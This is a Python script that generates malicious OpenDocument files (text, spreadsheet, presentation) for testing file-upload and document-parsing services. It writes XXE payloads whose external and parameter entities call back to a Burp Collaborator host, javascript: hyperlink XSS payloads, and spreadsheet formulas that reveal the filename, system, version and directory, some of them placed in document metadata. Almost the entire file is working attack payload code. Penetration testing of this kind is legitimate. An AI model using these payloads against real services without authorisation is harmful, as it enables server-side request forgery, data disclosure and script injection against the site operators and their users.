from pathlib import Path
import zipfile
import tempfile

def generate_office_payloads(output_dir, ext, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    extensions = {
        'odt': ('office:document', 'office:text'),
        'ods': ('office:document', 'office:spreadsheet'),
        'odp': ('office:document', 'office:presentation'),
    }
    
    if ext not in extensions:
        return
    
    root_ns, body_ns = extensions[ext]
    ext_dir = output_dir
    ext_dir.mkdir(parents=True, exist_ok=True)
    
    xxe_dir = ext_dir / 'xxe'
    xxe_dir.mkdir(exist_ok=True)
    xss_dir = ext_dir / 'xss'
    xss_dir.mkdir(exist_ok=True)
    info_dir = ext_dir / 'info'
    info_dir.mkdir(exist_ok=True)
    
    if ext == 'ods':
        ods_info1_cell_filename = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
<office:body>
<office:spreadsheet>
<table:table>
<table:table-row>
<table:table-cell office:value-type="string">
<text:p>=CELL("filename")</text:p>
</table:table-cell>
</table:table-row>
</table:table>
</office:spreadsheet>
</office:body>
</office:document>'''
        
        output_file = info_dir / "info1_cell_filename.ods"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "content.xml").write_text(ods_info1_cell_filename)
            (temp_path / "META-INF").mkdir()
            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
            (temp_path / "meta.xml").write_text('<?xml version="1.0"?><office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0"><office:meta><meta:initial-creator>=CELL("filename")</meta:initial-creator></office:meta></office:document-meta>')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        for formula, name in [('=INFO("version")', 'info2_info_version'), ('=INFO("system")', 'info3_info_system'), ('=NOW()', 'info4_now'), ('=INFO("directory")', 'info5_info_directory')]:
            ods_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
<office:body>
<office:spreadsheet>
<table:table>
<table:table-row>
<table:table-cell office:value-type="string">
<text:p>{formula}</text:p>
</table:table-cell>
</table:table-row>
</table:table>
</office:spreadsheet>
</office:body>
</office:document>'''
            
            output_file = info_dir / f"{name}.ods"
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                (temp_path / "content.xml").write_text(ods_content)
                (temp_path / "META-INF").mkdir()
                (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
                (temp_path / "meta.xml").write_text(f'<?xml version="1.0"?><office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0"><office:meta><meta:initial-creator>{formula}</meta:initial-creator></office:meta></office:document-meta>')
                
                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                    for file_path in temp_path.rglob('*'):
                        if file_path.is_file():
                            arcname = file_path.relative_to(temp_path)
                            zip_ref.write(file_path, arcname)
    
    if ext == 'odt':
        for formula, name in [('=CELL("filename")', 'info1_cell_filename'), ('=INFO("version")', 'info2_info_version'), ('=INFO("system")', 'info3_info_system'), ('=NOW()', 'info4_now'), ('=INFO("directory")', 'info5_info_directory')]:
            odt_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
<office:body>
<office:text>
<text:p>{formula}</text:p>
</office:text>
</office:body>
</office:document>'''
            
            output_file = info_dir / f"{name}.odt"
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                (temp_path / "content.xml").write_text(odt_content)
                (temp_path / "META-INF").mkdir()
                (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
                (temp_path / "meta.xml").write_text(f'<?xml version="1.0"?><office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0"><office:meta><meta:initial-creator>{formula}</meta:initial-creator></office:meta></office:document-meta>')
                
                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                    for file_path in temp_path.rglob('*'):
                        if file_path.is_file():
                            arcname = file_path.relative_to(temp_path)
                            zip_ref.write(file_path, arcname)
    
    odt_xxe1_doctype = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-{ext}-1">
]>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
<office:body>
<{body_ns}>
<text:p>test</text:p>
</{body_ns}>
</office:body>
</office:document>'''
    
    output_file = xxe_dir / f"xxe1_doctype.{ext}"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "content.xml").write_text(odt_xxe1_doctype)
        (temp_path / "META-INF").mkdir()
        (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    odt_xxe2_parameter = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{base_url}/xxe-{ext}-2">
%xxe;
]>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
<office:body>
<{body_ns}>
<text:p>test</text:p>
</{body_ns}>
</office:body>
</office:document>'''
    
    output_file = xxe_dir / f"xxe2_parameter.{ext}"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "content.xml").write_text(odt_xxe2_parameter)
        (temp_path / "META-INF").mkdir()
        (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    odt_xss1_hyperlink = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:xlink="http://www.w3.org/1999/xlink">
<office:body>
<{body_ns}>
<text:p text:style-name="P1">
<text:a xlink:href="javascript:alert(1)">click</text:a>
</text:p>
</{body_ns}>
</office:body>
</office:document>'''
    
    output_file = xss_dir / f"xss1_hyperlink.{ext}"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "content.xml").write_text(odt_xss1_hyperlink)
        (temp_path / "META-INF").mkdir()
        (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    master_file = ext_dir / f"master.{ext}"
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "content.xml").write_text(odt_xxe1_doctype)
        (temp_path / "META-INF").mkdir()
        (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
        
        with zipfile.ZipFile(master_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
